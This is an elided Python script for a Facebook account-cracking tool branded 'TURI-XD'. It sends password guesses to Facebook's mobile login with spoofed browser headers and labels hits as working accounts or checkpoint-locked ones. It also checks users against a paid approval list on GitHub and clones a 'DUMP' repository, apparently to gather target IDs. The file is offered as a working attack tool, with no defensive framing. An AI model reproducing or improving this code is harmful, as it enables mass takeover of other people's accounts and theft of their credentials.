...
def contact():
	os.system('xdg-open https://www.facebook.com/Samirsthaaa')
	back()
def clear():
	os.system('clear')
def back():
...
def approval():
  ...
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/SAMIRDONHONI/paid/blob/main/approval.txt").text
    if id in httpCaht:
...
def menu(my_name,my_id):
	...
	if Meledak in ['1']:
		...
		banner()
		info()
		os.system('git clone https://github.com/Hamii-king-06/DUMP.git')
		linex()
...
def passu():
	...
	linex()
	prog = Progress(TextColumn('\033[1;97m [TURI-XD]{task.description}'))
...
def crack(idf,pwv):
    ...
    'referer': 'https://m.facebook.com/?stype=lo&jlou=Afc5v2qlYuy8EogQwqaGbUUtQPJmpe5C4RMD65g8jKlFCeDQypgVpejHkBG8tCu-NfX61tPQJOJedP5EeG88rsxbDWh7fNUbQS6Csgm__-XdHA&smuh=29942&lh=Ac9yjdShbIFY1zP7hn0&_rdr',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\u001b[33m [TURI-CP] {idf} │ {pw}\033[1;97m')
				...
				print(f'\033[1;32m [TURI-OK] {idf} │ {pw}\033[1;97m')
